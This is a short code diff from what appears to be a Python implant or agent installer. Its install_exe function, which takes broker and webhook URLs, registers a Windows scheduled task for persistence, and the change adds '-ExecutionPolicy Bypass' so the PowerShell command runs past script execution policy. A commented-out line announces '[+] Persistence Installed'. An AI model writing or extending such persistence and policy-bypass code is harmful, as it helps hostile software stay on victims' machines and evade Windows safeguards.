@@ -72,7 +72,7 @@ def install_exe(broker_url, webhook_url):
     Register-ScheduledTask -TaskName "{task_name}" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
     """
     
-    subprocess.run(["powershell", "-Command", ps_cmd], check=True)
+    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd], check=True)
     # print(f"[+] Persistence Installed: Task '{task_name}'")
     
     # Start
